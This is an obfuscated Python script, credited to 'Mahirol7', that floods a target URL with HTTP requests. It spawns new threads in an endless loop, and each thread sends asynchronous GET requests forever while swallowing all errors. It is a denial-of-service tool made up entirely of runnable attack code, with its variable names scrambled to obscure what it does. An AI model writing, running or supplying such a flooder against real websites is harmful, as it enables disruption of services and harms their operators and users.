import threading 

import aiohttp 

import asyncio 

import time 

import os 

import sys 

url =""

def credit ():
    print ("» This code is written by Mahirol7.")

def mahirol7 (O0O0O0O0O000OO0O0 ):

    OOO0OOO0O000O0O00 =sys .platform 

    if OOO0OOO0O000O0O00 =="linux":

        os .system ("clear")

    else :

        os .system ("cls")

    OO000O000O00O00OO =0 

    OO0OO00OOOOO0O00O =[]

    OO00OOO0O00000O0O =0 

    async def O00OO000O00OO0OO0 (OOO0O00OOOO00O0OO ,O0OOOOOO0OOOOOO00 ):

        global r ,reqs 

        OO00O00OO00OOO0OO =int (time .time ())

        while True :

            try :

                async with OOO0O00OOOO00O0OO .get (O0OOOOOO0OOOOOO00 )as OOOOO0000000O0O00 :

                    if OOOOO0000000O0O00 :

                        OO00O00OOO00OOO0O =int (time .time ())

                        O00O0OOO00OO0OOO0 =OO00O00OO00OOO0OO -OO00O00OOO00OOO0O 

                        OO0O0O00O00O00O00 =str (O00O0OOO00OO0OOO0 ).replace ("-","")

                        if OOOOO0000000O0O00 .status ==200 :

                            r +=1 

                        reqs .append (OOOOO0000000O0O00 .status )

                    else :

                        pass 

            except Exception :

                pass 

    async def O00O000OO0O00O0O0 ():

        async with aiohttp .ClientSession ()as O00O0OOO00O0OOO00 :

            await O00OO000O00OO0OO0 (O00O0OOO00O0OOO00 ,O0O0O0O0O000OO0O0 )

    def OOOOO000OOO0OOOO0 ():

        OOO00OOOOOOOO00O0 =asyncio .new_event_loop ()

        try :#line:50

            OOO00OOOOOOOO00O0 .run_until_complete (O00O000OO0O00O0O0 ())

        except Exception :

            pass 

    class OO0OOO0O0O0O00OO0 :

        def __init__ (OOO000O00OOOOOO00 ,OOOOOOO0000O0O000 ):

            OOO000O00OOOOOO00 .url =OOOOOOO0000O0O000 

        def start (O000O000000OO00OO ):

            while True :

                try :

                    O0OOOO0OO000O0000 =threading .Thread (target =OOOOO000OOO0OOOO0 )

                    O0OOOO0OO000O0000 .start ()

                except Exception :

                    pass 

    O0O000OOO0OO0OO00 =OO0OOO0O0O0O00OO0 (O0O0O0O0O000OO0O0 )

    O0O000OOO0OO0OO00 .start ()

if __name__ =='__main__':

    credit ()

    mahirol7 (url )

